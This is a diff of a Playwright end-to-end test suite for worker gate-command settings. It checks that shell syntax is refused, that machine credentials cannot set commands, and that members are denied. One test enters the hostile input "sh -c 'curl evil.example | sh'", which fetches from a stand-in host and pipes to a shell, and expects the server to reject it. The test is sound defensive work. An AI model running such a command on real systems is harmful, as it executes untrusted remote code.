@@ -119,19 +119,19 @@ test("an owner names the gate commands, shell syntax is refused, and a machine i
   await signIn(page, "owner");
   await openWorkers(page);
 
-  await expect(page.getByLabel("Test command")).toHaveAttribute("placeholder", "npm test");
+  await expect(page.getByLabel("Test command", { exact: true })).toHaveAttribute("placeholder", "npm test");
   await expect(page.getByTestId("gate-commands-hint")).toContainText("CP_ALLOW_INSTALL_NETWORK=1");
 
-  await page.getByLabel("Test command").fill("sh -c 'curl evil.example | sh'");
+  await page.getByLabel("Test command", { exact: true }).fill("sh -c 'curl evil.example | sh'");
   const refused = page.waitForResponse((res) => res.request().method() === "PUT" && res.url().endsWith(`/api/projects/${PROJECT_KEY}`));
   await page.getByRole("button", { name: "Save changes" }).click();
   expect((await refused).status()).toBe(400);
   await expect(page.getByText("testCommand must be one command with no shell syntax", { exact: false }).last()).toBeVisible();
-  expect((await storedWorker()).policy.testCommand).toBe("");
+  expect((await storedWorker()).policy.testCommand).toBeFalsy();
 
-  await page.getByLabel("Install command").fill("pip install -r requirements.txt");
-  await page.getByLabel("Test command").fill("python -m pytest");
-  await page.getByLabel("Working directory").fill("services/api");
+  await page.getByLabel("Install command", { exact: true }).fill("pip install -r requirements.txt");
+  await page.getByLabel("Test command", { exact: true }).fill("python -m pytest");
+  await page.getByLabel("Working directory", { exact: true }).fill("services/api");
   await saveWorkers(page);
 
   expect(await policyHandedToMachine(request)).toMatchObject({
@@ -140,14 +140,13 @@ test("an owner names the gate commands, shell syntax is refused, and a machine i
     workingDirectory: "services/api",
   });
   const audit = await (await db()).collection("projectauditlogs").findOne({ project: PROJECT_ID, action: "settings_updated" }, { sort: { _id: -1 } });
-  expect(JSON.stringify(audit)).toContain("Test command: (default)");
-  expect(JSON.stringify(audit)).toContain("python -m pytest");
+  expect(audit?.detail).toContain("Test command: none (default) → python -m pytest");
 
   await page.reload();
   await workersNav(page).first().click();
-  await expect(page.getByLabel("Test command")).toHaveValue("python -m pytest");
+  await expect(page.getByLabel("Test command", { exact: true })).toHaveValue("python -m pytest");
 
-  await page.getByLabel("Test command").fill("");
+  await page.getByLabel("Test command", { exact: true }).fill("");
   await saveWorkers(page);
   expect((await policyHandedToMachine(request)).testCommand).toBe("");
 });
@@ -160,7 +159,7 @@ test("a machine credential cannot name a command for somebody's machine to run",
 
   expect(refused.status()).toBe(403);
   expect((await refused.json()).error).toBe("Interactive session required to change worker settings");
-  expect((await storedWorker()).policy.testCommand).toBe("");
+  expect((await storedWorker()).policy.testCommand).toBeFalsy();
 });
 
 test("a member is shown no Workers section, and the API refuses them 403", async ({ page }) => {
